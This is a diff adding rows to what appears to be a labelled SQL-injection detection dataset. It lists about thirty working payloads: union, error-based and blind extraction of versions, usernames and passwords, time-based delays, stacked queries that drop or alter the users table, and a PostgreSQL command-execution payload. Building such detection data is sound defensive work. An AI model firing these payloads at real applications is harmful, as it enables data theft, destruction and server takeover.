@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint
+41400,"' UNION SELECT NULL,NULL FROM dual--",1,oracle_union
+41401,' AND 1=(SELECT COUNT(*) FROM all_tables)--,1,oracle_enum
+41402,'; SELECT PG_SLEEP(5)--,1,pgsql_timebased
+41403,"' UNION SELECT NULL::text,NULL::text--",1,pgsql_union
+41404,1;SELECT version()--,1,pgsql_enum
+41405,' AND 1=(SELECT COUNT(*) FROM pg_tables)--,1,pgsql_enum
+41406,'; COPY (SELECT '') TO PROGRAM 'id'--,1,pgsql_rce
+41407,"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",1,error_extractvalue
+41408,"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",1,error_updatexml
+41409,"' AND (SELECT 8878 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_floor_rand
+41410,"' AND GTID_SUBSET(CONCAT(0x7e,(SELECT version())),1337)--",1,error_gtid
+41411,"' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,version())) USING utf8)))--",1,error_json
+41412,1 AND POLYGON((SELECT * FROM (SELECT * FROM (SELECT @@version) f) x))--,1,error_geometry
+41413,' AND EXP(~(SELECT * FROM (SELECT user())x))--,1,error_exp
+41414,' AND SLEEP(5) AND '1'='1,1,timebased_sleep
+41415,1 AND (SELECT * FROM (SELECT(SLEEP(3)))a)--,1,timebased_subquery
+41416,"' AND IF(1=1,SLEEP(5),0)--",1,timebased_if
+41417,'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'--,1,timebased_if_mssql
+41418,1 AND 1=(SELECT 1 FROM (SELECT SLEEP(3)) t)--,1,timebased_nested
+41419,"' AND SUBSTRING(username,1,1)='a' AND '1'='1",1,boolean_substring
+41420,"' AND ASCII(SUBSTR(username,1,1))>64--",1,boolean_ascii
+41421,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--,1,boolean_count
+41422,"' AND MID(version(),1,1)='5'--",1,boolean_mid
+41423,"' AND BINARY SUBSTRING(password,1,1)='a'--",1,boolean_binary
+41424,' OR 1=1--,1,whitespace_tab
+41425,' OR 1 = 1--,1,whitespace_comment_heavy
+41426,'; DROP TABLE users; --,1,stacked_drop
+41427,"'; INSERT INTO users VALUES('hacker','pw')--",1,stacked_insert
+41428,1'; UPDATE users SET password='hacked' WHERE '1'='1,1,stacked_update
+41429,'; EXEC('SELECT 1')--,1,stacked_exec
